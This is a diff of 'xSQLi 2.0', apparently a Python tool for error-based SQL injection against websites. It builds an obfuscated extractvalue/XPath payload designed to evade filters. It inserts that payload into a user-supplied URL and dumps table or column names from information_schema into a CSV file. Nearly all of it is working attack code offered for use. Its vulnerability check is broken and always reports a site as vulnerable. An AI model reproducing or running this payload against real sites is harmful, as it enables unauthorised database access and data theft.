@@ -1,29 +1,67 @@
 #/!python3
 #!/usr/bin/python3
 
-import re
-import requests
+import re,csv,requests
 
-target = input('\n\033[94m Injection Ponit  :\033[0m ')
-dump = input('\033[94m (table/column)?  :\033[0m ') or "table"
-frm = int(input('\033[94m From 	(Def - 0) :\033[0m ') or "0")
-to = int(input('\033[94m To 	(Def - 5) :\033[0m ') or "5")
+def checkInjection(response):
+	print("\n\tChecking...")
+	if("your SQL syntax" or "mysql_num_rows()" in response):
+		print("\n\t\tSeems Vulnerable,\n\t\t\tLet's Dump \""+dump+"\" From DATABASE Using Xpath Injection Method\n")
+	else:
+		print("\n\t\tLooks Not Vulnerable!!!\n")
+	return
 
-print("\n\033[1m________________________________________________________________________\033[0m\n")
+print("""
 
-regex = r"(?<=':)(.*)(?=')"
+	██╗  ██╗███████╗ ██████╗ ██╗     ██╗    ██████╗     ██████╗ 
+	╚██╗██╔╝██╔════╝██╔═══██╗██║     ██║    ╚════██╗   ██╔═████╗
+	 ╚███╔╝ ███████╗██║   ██║██║     ██║     █████╔╝   ██║██╔██║
+	 ██╔██╗ ╚════██║██║▄▄ ██║██║     ██║    ██╔═══╝    ████╔╝██║
+	██╔╝ ██╗███████║╚██████╔╝███████╗██║    ███████╗██╗╚██████╔╝
+	╚═╝  ╚═╝╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝    ╚══════╝╚═╝ ╚═════╝ 
+					     
+	By #Nittam (@TheNittam)			     @CryptoGenNepal
+	https://nirmaldahal.com.np 	      https://CryptoGenNepal
+""")
+
+url = input("\n\tEnter URL : ")
+dump = input('\tDump (Table | Column), Default: Table: ') or "table"
+
 payload = " and extractvalue(0x3a,concat/*!(0x3a,(/*!00000SelEcT*/ concat/*!("+dump+"_name)*/ /*!from*/ information_schema./**/"+dump+"s where table_schema=database() limit {},1)))-- -"
 
-for x in range(frm, to):
+if re.search(r"[^?]*?=[^?]*",url):
 
-	url = target.replace("inject",payload).format(x)
-	response = requests.get(url=url)
-	matches = re.finditer(regex, str(response.text))
-	for matchNum, match in enumerate(matches):
-		matchNum = matchNum + 1
-		for groupNum in range(0, len(match.groups())):
-			groupNum = groupNum + 1
-			print ( str(x)+") {group}".format(group = match.group(groupNum)))
+	get = requests.get(url)
+	response = get.text
+	checkInjection(response)
 
-print("________________________________________________________________________")
-print("\n\t\t\tDumped!!!\n")
+	x = 0
+	while True:
+		x += 1
+		target = url.replace("inject",payload).format(x)
+		get = requests.get(target)
+
+		if(not "XPATH syntax error" in get.text):
+			print("""
+			   ___                         __
+			  / _ \\__ ____ _  ___  ___ ___/ /
+			 / // / // /  ' \\/ _ \\/ -_) _  / 
+			/____/\\_,_/_/_/_/ .__/\\__/\\_,_/  as ("""+dump+""".csv)
+			               /_/               
+
+				""")
+			break
+		else:
+			matches = re.finditer(r"XPATH syntax error\: '\:(.*?)'", get.text, re.MULTILINE)
+
+			for Nittam, match in enumerate(matches, start=1):
+				for result in range(0, len(match.groups())):
+					result = result + 1
+					group = match.group(result)
+					print("\t\t\t"+str(x)+")\t=>\t"+group)
+
+					writer = csv.writer(open(dump+'.csv', 'a'))
+					writer.writerows([[x,group]])
+
+else:
+	print("\n\n\tInvalid Domain Name Or Unsupported Method \"POST\" Detected.\n\tPlease Wait For \"xSQLi.py v3\"  Or Contact whois@cryptogennepal.com")
